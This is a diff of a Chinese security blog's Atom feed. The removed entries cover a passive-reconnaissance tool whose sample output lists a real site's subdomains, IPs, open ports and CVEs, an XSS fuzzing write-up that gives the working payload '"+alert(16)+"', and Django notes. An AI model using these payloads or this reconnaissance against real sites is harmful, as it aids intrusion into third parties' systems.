@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.teamssix.com/"/>
-  <updated>2020-03-21T07:38:39.283Z</updated>
+  <updated>2020-04-19T07:22:07.717Z</updated>
   <id>https://www.teamssix.com/</id>
   
   <author>
@@ -17,592 +17,482 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>【工具分享】Pigat v2.0正式发布</title>
-    <link href="https://www.teamssix.com/year/200321-150643.html"/>
-    <id>https://www.teamssix.com/year/200321-150643.html</id>
-    <published>2020-03-21T07:06:43.000Z</published>
-    <updated>2020-03-21T07:38:39.283Z</updated>
+    <title>【CS学习笔记】28、白名单申请和宏渗透</title>
+    <link href="https://www.teamssix.com/year/200419-150740.html"/>
+    <id>https://www.teamssix.com/year/200419-150740.html</id>
+    <published>2020-04-19T07:07:40.000Z</published>
+    <updated>2020-04-19T07:22:07.717Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Pigat（Passive Intelligence Gathering Aggregation Tool）被动信息收集聚合工具，该工具通过爬取目标URL在第三方网站比如备案查询网站、子域名查询网站的结果来对目标进行被动信息收集。</p><p>开发此工具的初衷就是平时在使用一些第三方的网站进行目标信息收集的时候，往往需要利用多个网站进行目标信息的收集，比如通过在线的Whois信息查询网站、在线的CMS信息查询网站、目标在Shodan上的信息等等，如此一来，就会增加很多重复的工作量，因此便开发了此工具，将平时常用的网站聚合到一个工具里。</p><p>该工具在2020年3月21日更新至2.0版本，该版本采用Scrapy框架开发，协程处理，运行速度更快，并且支持文件导出功能，同时修复了多个Bug，增加了多个功能。</p><a id="more"></a><h2 id="功能描述"><a href="#功能描述" class="headerlink" title="功能描述"></a>功能描述</h2><ul><li>被动收集备案信息</li><li>被动收集 Whois 信息</li><li>被动收集子域名信息</li><li>被动收集子域名 IP 信息</li><li>被动收集子域名 CMS 信息</li><li>被动收集子域名 Shodan 信息</li><li>被动收集子域名漏洞信息</li></ul><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="1、安装MongoDB"><a href="#1、安装MongoDB" class="headerlink" title="1、安装MongoDB"></a>1、安装MongoDB</h3><p>这一步可自行百度，如果不是在本地主机安装，则需要在安装MongoDB之后修改<code>setting.py</code>文件的第72行，将数据库的URL及端口改为自己设置的即可，默认配置如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MONGO_DB_URI = <span class="string">'mongodb://localhost:27017'</span></span><br></pre></td></tr></table></figure><h3 id="2、安装第三方模块文件"><a href="#2、安装第三方模块文件" class="headerlink" title="2、安装第三方模块文件"></a>2、安装第三方模块文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure><h3 id="3、开始运行"><a href="#3、开始运行" class="headerlink" title="3、开始运行"></a>3、开始运行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 start.py -u target.com</span><br></pre></td></tr></table></figure><h2 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-u ：指定要被动收集的url</span><br><span class="line">-o : 导出被动收集结果，支持 CSV、JSON、XML 等格式，结果将保存到 ./output 目录下</span><br><span class="line">-a : 直接被动收集所有结果，没有步骤提示信息，并默认导出 result.csv 文件</span><br><span class="line">-h : 查看帮助</span><br></pre></td></tr></table></figure><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="python3-start-py-u-teamssix-com"><a href="#python3-start-py-u-teamssix-com" class="headerlink" title="python3 start.py -u teamssix.com"></a>python3 start.py -u teamssix.com</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line"> 操作编号：</span><br><span class="line"></span><br><span class="line"> [1] 被动收集备案信息</span><br><span class="line"> [2] 被动收集 Whois 信息</span><br><span class="line"> [3] 被动收集子域名信息</span><br><span class="line"> [4] 被动收集子域名 IP 信息</span><br><span class="line"> [5] 被动收集子域名 CMS 信息</span><br><span class="line"> [6] 被动收集子域名 Shodan 信息</span><br><span class="line"> [7] 被动收集子域名漏洞信息</span><br><span class="line"> [8] 退出程序</span><br><span class="line"> 备注：第 3 步执行一次后才可执行 4、5、6 步，第 6 步执行一次后才可执行第 7 步，否则运行会出现错误提示。</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line"></span><br><span class="line">[2020-03-21 13:36:35] 请输入你的操作步骤 :</span><br></pre></td></tr></table></figure><h3 id="python3-start-py-u-teamssix-com-a"><a href="#python3-start-py-u-teamssix-com-a" class="headerlink" title="python3 start.py -u teamssix.com -a"></a>python3 start.py -u teamssix.com -a</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">[2020-03-21 13:45:50] 正在被动收集 freebuf.com 的备案信息……</span><br><span class="line">[2020-03-21 13:45:50] 备案网站名称：黑客与极客</span><br><span class="line">[2020-03-21 13:45:50] 备案单位类型：企业</span><br><span class="line">[2020-03-21 13:45:50] 备案单位名称：上海斗象信息科技有限公司</span><br><span class="line">[2020-03-21 13:45:50] 备案网站首页：www.freebuf.com</span><br><span class="line">[2020-03-21 13:45:50] 备案许可证号：沪ICP备13033796号-1</span><br><span class="line">[2020-03-21 13:45:50] 备案审核时间：2019/7/17</span><br><span class="line"></span><br><span class="line">[2020-03-21 13:45:56] 正在被动收集 freebuf.com 的 Whois 信息……</span><br><span class="line">[2020-03-21 13:45:56] 注册商：Alibaba Cloud Computing (Beijing) Co., Ltd.</span><br><span class="line">[2020-03-21 13:45:56] 注册邮箱：DomainAbuse@service.aliyun.com</span><br><span class="line">[2020-03-21 13:45:56] 注册电话：+86.95187</span><br><span class="line">[2020-03-21 13:45:56] 注册网址：http://www.net.cn</span><br><span class="line">[2020-03-21 13:45:56] 注册商 Whois 服务器：grs-whois.hichina.com</span><br><span class="line">[2020-03-21 13:45:56] DNS 解析服务器：[<span class="string">'F1G1NS1.DNSPOD.NET'</span>, <span class="string">'F1G1NS2.DNSPOD.NET'</span>]</span><br><span class="line">[2020-03-21 13:45:56] 注册日期：2010-08-21T15:24:37Z</span><br><span class="line">[2020-03-21 13:45:56] 到期日期：2021-08-21T15:24:37Z</span><br><span class="line">[2020-03-21 13:45:56] 更新日期：2020-02-27T02:03:14Z</span><br><span class="line"></span><br><span class="line">[2020-03-21 13:46:04] 正在被动收集 freebuf.com 的子域信息……</span><br><span class="line">[2020-03-21 13:46:04] 搜索<span class="string">"freebuf.com"</span>查询结果为:29条。响应时间：5.204秒，搜索结果共 2 页</span><br><span class="line">[2020-03-21 13:46:04] zhuanlan.freebuf.com      专栏 - FreeBuf 互联网安全新媒体平台 | 关注黑客与极客    200</span><br><span class="line">[2020-03-21 13:46:04] you3enter.freebuf.com     空</span><br><span class="line">[2020-03-21 13:46:04] www.freebuf.com   FreeBuf互联网安全新媒体平台     200</span><br><span class="line">……此处内容太多，省略……</span><br><span class="line">[2020-03-21 13:46:06] ai.freebuf.com    空</span><br><span class="line">[2020-03-21 13:46:06] freebuf.com       FreeBuf互联网安全新媒体平台     200</span><br><span class="line"></span><br><span class="line">[2020-03-21 13:46:09] 正在被动收集 freebuf.com 的子域 IP 信息……</span><br><span class="line">[2020-03-21 13:46:09] 提示：如果出现大量无法判断 IP 的情况，请尝试更换自己的IP</span><br><span class="line">[2020-03-21 13:46:09] freebuf.com       wittest.freebuf.com             123.57.248.123</span><br><span class="line">[2020-03-21 13:46:09] freebuf.com       www.freebuf.com         123.57.145.69</span><br><span class="line">……此处内容太多，省略……</span><br><span class="line">[2020-03-21 13:46:12] freebuf.com       ai.freebuf.com          无法判断 IP</span><br><span class="line">[2020-03-21 13:46:14] freebuf.com       static.freebuf.com              39.96.250.248</span><br><span class="line"></span><br><span class="line">[2020-03-21 13:46:17] 正在被动收集 freebuf.com 的子域 CMS 信息……</span><br><span class="line">[2020-03-21 13:46:18] freebuf.com       static.freebuf.com                      Apache 2.2.21</span><br><span class="line">[2020-03-21 13:46:19] freebuf.com       wittest.freebuf.com     WitAwards 2017互联网安全年度评选                源</span><br><span class="line">……此处内容太多，省略……</span><br><span class="line">[2020-03-21 13:46:28] freebuf.com       bar.freebuf.com FreeBuf小酒馆           Apache 2.2.21</span><br><span class="line">[2020-03-21 13:46:29] freebuf.com       company.freebuf.com     FreeBuf.COM | 企业空间          jQuery 2.0.3    Twitter Bootstrap       Tengine PHP</span><br><span class="line"></span><br><span class="line">[2020-03-21 13:47:23] 正在被动收集 freebuf.com 的子域 shodan 信息……</span><br><span class="line">[2020-03-21 13:47:23] 如果您的 api 输入错误，可到数据库中修改</span><br><span class="line">[2020-03-21 13:47:26] freebuf.com       123.57.145.69   [<span class="string">'www.freebuf.com'</span>, <span class="string">'search.freebuf.com'</span>]       China   Aliyun Computing Co.    None    [80]</span><br><span class="line"></span><br><span class="line">[2020-03-21 13:47:26] freebuf.com       182.254.150.199 [<span class="string">'freebuf.com'</span>, <span class="string">'freebuf.com'</span>]  China   Tencent cloud computing None    [443]   [<span class="string">'CVE-2016-6291'</span>, <span class="string">'CVE-2016-6290'</span>, <span class="string">'CVE-2016-6292'</span>, <span class="string">'CVE-2016-4473'</span>, <span class="string">'CVE-2016-6294'</span>, <span class="string">'CVE-2016-6297'</span>,</span><br><span class="line"> <span class="string">'CVE-2016-5767'</span>, <span class="string">'CVE-2016-5768'</span>, <span class="string">'CVE-2016-5769'</span>, <span class="string">'CVE-2018-10547'</span>, <span class="string">'CVE-2018-10546'</span>, <span class="string">'CVE-2019-9641'</span>, <span class="string">'CVE-2016-6295'</span>, <span class="string">'CVE-2018-10548'</span>, <span class="string">'CVE-2018-19520'</span>, <span class="string">'CVE-2018-19396'</span>, <span class="string">'CVE-2016-7478'</span>, <span class="string">'CVE-2016-5766'</span>, <span class="string">'CVE-2018-19935'</span>, <span class="string">'CVE-2016-</span></span><br><span class="line"><span class="string">6296'</span>, <span class="string">'CVE-2018-17082'</span>, <span class="string">'CVE-2018-10545'</span>, <span class="string">'CVE-2019-9639'</span>, <span class="string">'CVE-2019-9638'</span>, <span class="string">'CVE-2019-9637'</span>, <span class="string">'CVE-2015-8994'</span>, <span class="string">'CVE-2018-14883'</span>, <span class="string">'CVE-2016-5773'</span>, <span class="string">'CVE-2016-5772'</span>, <span class="string">'CVE-2016-5771'</span>, <span class="string">'CVE-2016-5770'</span>, <span class="string">'CVE-2016-6289'</span>, <span class="string">'CVE-2018-19395'</span>, <span class="string">'CVE-2</span></span><br><span class="line"><span class="string">019-6977'</span>, <span class="string">'CVE-2018-20783'</span>, <span class="string">'CVE-2016-7568'</span>, <span class="string">'CVE-2018-19518'</span>, <span class="string">'CVE-2016-5399'</span>, <span class="string">'CVE-2019-9023'</span>, <span class="string">'CVE-2019-9020'</span>, <span class="string">'CVE-2019-9021'</span>, <span class="string">'CVE-2017-16642'</span>, <span class="string">'CVE-2019-9024'</span>, <span class="string">'CVE-2018-15132'</span>, <span class="string">'CVE-2018-10549'</span>]</span><br><span class="line"></span><br><span class="line">[2020-03-21 13:47:46] freebuf.com       123.57.248.123  [<span class="string">'wittest.freebuf.com'</span>, <span class="string">'wittest.freebuf.com'</span>]  China   Aliyun Computing Co.    None    [80, 443, 2222] [<span class="string">'CVE-2012-0021'</span>, <span class="string">'CVE-2017-15906'</span>, <span class="string">'CVE-2011-4317'</span>, <span class="string">'CVE-2017-7679'</span>, <span class="string">'CVE-201</span></span><br><span class="line"><span class="string">6-0777'</span>, <span class="string">'CVE-2018-1312'</span>, <span class="string">'CVE-2011-3368'</span>, <span class="string">'CVE-2012-3499'</span>, <span class="string">'CVE-2012-4558'</span>, <span class="string">'CVE-2013-1896'</span>, <span class="string">'CVE-2011-5000'</span>, <span class="string">'CVE-2016-8612'</span>, <span class="string">'CVE-2014-1692'</span>, <span class="string">'CVE-2012-4557'</span>, <span class="string">'CVE-2014-0098'</span>, <span class="string">'CVE-2017-7668'</span>, <span class="string">'CVE-2012-0814'</span>, <span class="string">'CVE-2013-6438'</span>, <span class="string">'CVE-201</span></span><br><span class="line"><span class="string">2-2687'</span>, <span class="string">'CVE-2011-4415'</span>, <span class="string">'CVE-2012-0031'</span>, <span class="string">'CVE-2010-5107'</span>, <span class="string">'CVE-2013-2249'</span>, <span class="string">'CVE-2016-10708'</span>, <span class="string">'CVE-2011-3607'</span>, <span class="string">'CVE-2017-3167'</span>, <span class="string">'CVE-2011-4327'</span>, <span class="string">'CVE-2012-0053'</span>, <span class="string">'CVE-2012-0883'</span>, <span class="string">'CVE-2017-3169'</span>, <span class="string">'CVE-2014-0231'</span>, <span class="string">'CVE-2013-1862'</span>, <span class="string">'CVE-20</span></span><br><span class="line"><span class="string">16-4975'</span>, <span class="string">'CVE-2010-4478'</span>, <span class="string">'CVE-2010-4755'</span>]</span><br><span class="line"></span><br><span class="line">[2020-03-21 13:47:54] freebuf.com       39.96.250.248   [<span class="string">'zhuanlan.freebuf.com'</span>, <span class="string">'shop.freebuf.com'</span>, <span class="string">'wit.freebuf.com'</span>, <span class="string">'my.freebuf.com'</span>, <span class="string">'open.freebuf.com'</span>, <span class="string">'static.freebuf.com'</span>, <span class="string">'live.freebuf.com'</span>, <span class="string">'job.freebuf.com'</span>, <span class="string">'prize.freebuf.com'</span></span><br><span class="line">, <span class="string">'www.freebuf.com'</span>, <span class="string">'fit.freebuf.com'</span>, <span class="string">'api.freebuf.com'</span>, <span class="string">'chat.freebuf.com'</span>, <span class="string">'bar.freebuf.com'</span>, <span class="string">'company.freebuf.com'</span>, <span class="string">'wit.freebuf.com'</span>, <span class="string">'prize.freebuf.com'</span>, <span class="string">'zhuanlan.freebuf.com'</span>, <span class="string">'open.freebuf.com'</span>, <span class="string">'live.freebuf.com'</span>, <span class="string">'job.freebuf.</span></span><br><span class="line"><span class="string">com'</span>, <span class="string">'fit.freebuf.com'</span>, <span class="string">'my.freebuf.com'</span>, <span class="string">'shop.freebuf.com'</span>, <span class="string">'api.freebuf.com'</span>, <span class="string">'chat.freebuf.com'</span>, <span class="string">'company.freebuf.com'</span>, <span class="string">'bar.freebuf.com'</span>, <span class="string">'static.freebuf.com'</span>]   China   Aliyun Computing Co.    None    [5000, 6666, 8334, 8080, 8081,</span><br><span class="line"> 7443, 8086, 8087, 8090, 10000, 9201, 9000, 8106, 9003, 53, 443, 8000, 8001, 8002, 8009, 81, 82, 83, 7001, 4443, 8800, 7777, 1000, 9200, 6001, 8181, 8443, 9002]</span><br><span class="line"></span><br><span class="line">[2020-03-21 13:47:57] 正在被动收集 freebuf.com 的漏洞详情信息……</span><br><span class="line">[2020-03-21 13:47:58] freebuf.com       CVE-2016-6291   高危    PHPext/exif/exif.c文件安全漏洞  182.254.150.199 [<span class="string">'freebuf.com'</span>] http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201607-929</span><br><span class="line"></span><br><span class="line">[2020-03-21 13:47:58] freebuf.com       CVE-2016-6292   中危    PHPext/exif/exif.c文件安全漏洞  182.254.150.199 [<span class="string">'freebuf.com'</span>] http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201607-930</span><br><span class="line"></span><br><span class="line">[2020-03-21 13:47:58] freebuf.com       CVE-2016-4473   高危    PHP安全漏洞     182.254.150.199 [<span class="string">'freebuf.com'</span>] http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201610-062</span><br><span class="line"></span><br><span class="line">[2020-03-21 13:47:58] freebuf.com       CVE-2016-5768   高危    PHPmbstring扩展整数溢出漏洞     182.254.150.199 [<span class="string">'freebuf.com'</span>] http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201606-559</span><br><span class="line"></span><br><span class="line">[2020-03-21 13:47:58] freebuf.com       CVE-2016-6297   中危    PHPext/zip/zip_stream.c文件整数溢出漏洞 182.254.150.199 [<span class="string">'freebuf.com'</span>] http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201607-935</span><br><span class="line"></span><br><span class="line">……此处内容太多，省略……</span><br></pre></td></tr></table></figure><h2 id="运行截图"><a href="#运行截图" class="headerlink" title="运行截图"></a>运行截图</h2><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-03-21_14-29-32.png" alt></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-03-21_14-30-07.png" alt></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-03-21_14-30-21.png" alt></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-03-21_14-30-33.png" alt></p><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/teamssix/pigat/releases</span><br></pre></td></tr></table></figure><p><a href="https://github.com/teamssix/pigat/releases" target="_blank" rel="noopener">点击此处进入下载页面</a></p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>因为我没有太多的开发经验，因此该工具难免存在有问题以及不恰当的地方，希望各位大佬在使用的过程中碰到问题能够多多反馈。</p><p>开发不易，还望大佬们走过路过顺手给个star，小弟将不胜感激。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Pigat（Passive Intelligence Gathering Aggregation Tool）被动信息收集聚合工具，该工具通过爬取目标URL在第三方网站比如备案查询网站、子域名查询网站的结果来对目标进行被动信息收集。&lt;/p&gt;
-&lt;p&gt;开发此工具的初衷就是平时在使用一些第三方的网站进行目标信息收集的时候，往往需要利用多个网站进行目标信息的收集，比如通过在线的Whois信息查询网站、在线的CMS信息查询网站、目标在Shodan上的信息等等，如此一来，就会增加很多重复的工作量，因此便开发了此工具，将平时常用的网站聚合到一个工具里。&lt;/p&gt;
-&lt;p&gt;该工具在2020年3月21日更新至2.0版本，该版本采用Scrapy框架开发，协程处理，运行速度更快，并且支持文件导出功能，同时修复了多个Bug，增加了多个功能。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
-    
-    
-      <category term="工具分享" scheme="https://www.teamssix.com/tags/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
-    
-      <category term="软件" scheme="https://www.teamssix.com/tags/%E8%BD%AF%E4%BB%B6/"/>
-    
-      <category term="Pigat" scheme="https://www.teamssix.com/tags/Pigat/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【渗透实例】Fuzz大法好啊</title>
-    <link href="https://www.teamssix.com/year/200310-221008.html"/>
-    <id>https://www.teamssix.com/year/200310-221008.html</id>
-    <published>2020-03-10T14:10:08.000Z</published>
-    <updated>2020-03-10T14:24:53.292Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><blockquote><p>本文仅供学习分享用途，严禁用于违法用途</p></blockquote><p>在搞站的时候，经过一顿操作后只发现了一堆低危，过了一段时间看看Xray，居然发现一个XSS</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/1Snipaste_2020-03-10_14-10-35.png" alt></p><p>嗯~ Xray 真香！</p><a id="more"></a><p>随后进行复现，无奈多次尝试无果，好玩的是每换一个Payload，流量经过 Xray ，Xray 还会继续报这个漏洞，并且每次Payload都不一样，这感情好，直接用 Xray 给的 Payload 吧，尝试了半天，居然没有一个成功的，当时 Xray 的界面是这样的</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2Snipaste_2020-03-10_14-19-23.png" alt></p><p>虽然没有一个成功复现的，但是这看着还是挺爽的，一会儿报个漏洞一会儿报个漏洞的</p><h1 id="0x01-Fuzz大法好"><a href="#0x01-Fuzz大法好" class="headerlink" title="0x01 Fuzz大法好"></a>0x01 Fuzz大法好</h1><p>屡试不行之后便想到了Fuzz，那先去GitHub上找个字典</p><blockquote><p><a href="https://github.com/TheKingOfDuck/fuzzDicts" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/fuzzDicts</a></p></blockquote><p>有了字典之后，上Burp</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/3Snipaste_2020-03-10_14-26-42.png" alt></p><p>两千多的字典最后只有3个Payload响应200，不管了，先一个一个试试吧，那就先来试试第一个Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;+alert(16)+&quot;</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/4Snipaste_2020-03-10_14-29-54.png" alt></p><p>哎呀呀，不得不说，妙啊！</p><p>之后我再试另外几个 Payload 就不管用了</p><p>啧啧，Xray 真香、Fuzz 真香。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
+    <content type="html"><![CDATA[<p>此文章待更新……</p><a id="more"></a><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5" target="_blank" rel="noopener">https://www.bilibili.com/video/BV16b411i7n5</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
     
     <summary type="html">
     
-      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;blockquote&gt;
-&lt;p&gt;本文仅供学习分享用途，严禁用于违法用途&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;在搞站的时候，经过一顿操作后只发现了一堆低危，过了一段时间看看Xray，居然发现一个XSS&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://teamssix.oss-cn-hangzhou.aliyuncs.com/1Snipaste_2020-03-10_14-10-35.png&quot; alt&gt;&lt;/p&gt;
-&lt;p&gt;嗯~ Xray 真香！&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="渗透实例" scheme="https://www.teamssix.com/categories/%E6%B8%97%E9%80%8F%E5%AE%9E%E4%BE%8B/"/>
-    
-    
-      <category term="渗透实例" scheme="https://www.teamssix.com/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E4%BE%8B/"/>
-    
-      <category term="Fuzz" scheme="https://www.teamssix.com/tags/Fuzz/"/>
-    
-      <category term="Xray" scheme="https://www.teamssix.com/tags/Xray/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【Django 学习笔记】5、常用功能</title>
-    <link href="https://www.teamssix.com/year/200304-132209.html"/>
-    <id>https://www.teamssix.com/year/200304-132209.html</id>
-    <published>2020-03-04T05:22:09.000Z</published>
-    <updated>2020-03-04T12:02:55.734Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-案例实现"><a href="#0x00-案例实现" class="headerlink" title="0x00 案例实现"></a>0x00 案例实现</h1><ul><li>创建的项目名称为<code>BookManager</code>，创建应用名称为<code>Book</code>，完成<code>图书信息</code>的维护</li><li>访问图书信息列表<code>127.0.0.1:8000/booklist</code>，并且点击每个图书能够跳转到对应图书人物信息界面</li></ul><a id="more"></a><h1 id="0x01-代码实现"><a href="#0x01-代码实现" class="headerlink" title="0x01 代码实现"></a>0x01 代码实现</h1><p>1、修改<code>templates\booklist.html</code>代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原来：<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">现在：<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; book.id &#125;&#125;/"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span> #通过id值来进行对应书籍人物信息查询</span><br></pre></td></tr></table></figure><p>2、在<code>Book\views.py</code>中新添<code>peoplelist</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peoplelist</span><span class="params">(request, book_id)</span>:</span><span class="comment">#book_id从url中直接传入</span></span><br><span class="line">   book = BookInfo.objects.get(id=book_id)<span class="comment">#通过id查询书籍</span></span><br><span class="line">   people_list = book.peopleinfo_set.all()<span class="comment">#获取书籍中的所有人物</span></span><br><span class="line">   context = &#123;</span><br><span class="line">      <span class="string">'people_list'</span>: people_list</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> render(request, <span class="string">'peoplelist.html'</span>, context)</span><br></pre></td></tr></table></figure><p>3、在<code>BookManager\urls.py</code>中新添url规则</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re_path(<span class="string">r'^booklist/(\d+)/$'</span>, views.peoplelist), <span class="comment">#(\d+)里的内容将直接传入peoplelist函数中的book_id参数</span></span><br></pre></td></tr></table></figure><p>如果没有导入re_path需要导入一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> re_path</span><br></pre></td></tr></table></figure><p>4、新建<code>templates\eoplelist.html</code>文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span 